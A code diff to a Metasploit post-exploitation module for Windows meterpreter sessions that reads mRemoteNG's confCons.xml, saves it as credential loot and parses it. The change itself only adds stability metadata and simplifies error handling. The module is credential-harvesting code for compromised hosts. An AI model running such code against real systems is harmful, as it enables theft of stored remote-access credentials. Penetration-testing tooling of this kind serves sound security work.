@@ -28,7 +28,12 @@ class MetasploitModule < Msf::Post
           'mubix' # Helped write the Decryption Routine
         ],
         'Platform' => [ 'win' ],
-        'SessionTypes' => [ 'meterpreter' ]
+        'SessionTypes' => [ 'meterpreter' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
       )
     )
   end
@@ -48,18 +53,16 @@ class MetasploitModule < Msf::Post
 
   def get_xml(path)
     print_status("Looking for #{path}")
-    begin
-      if file_exist?(path)
-        condata = read_file(path)
-        loot_path = store_loot('mremote.creds', 'text/xml', session, condata, path)
-        vprint_good("confCons.xml saved to #{loot_path}")
-        parse_xml(condata)
-        print_status("Finished processing #{path}")
-      end
-    rescue Rex::Post::Meterpreter::RequestError
-      print_status("The file #{path} either could not be read or does not exist")
-      return
-    end
+
+    return unless file_exist?(path)
+
+    condata = read_file(path)
+    loot_path = store_loot('mremote.creds', 'text/xml', session, condata, path)
+    vprint_good("confCons.xml saved to #{loot_path}")
+    parse_xml(condata)
+    print_status("Finished processing #{path}")
+  rescue Rex::Post::Meterpreter::RequestError
+    print_status("The file #{path} either could not be read or does not exist")
   end
 
   def parse_xml(data)
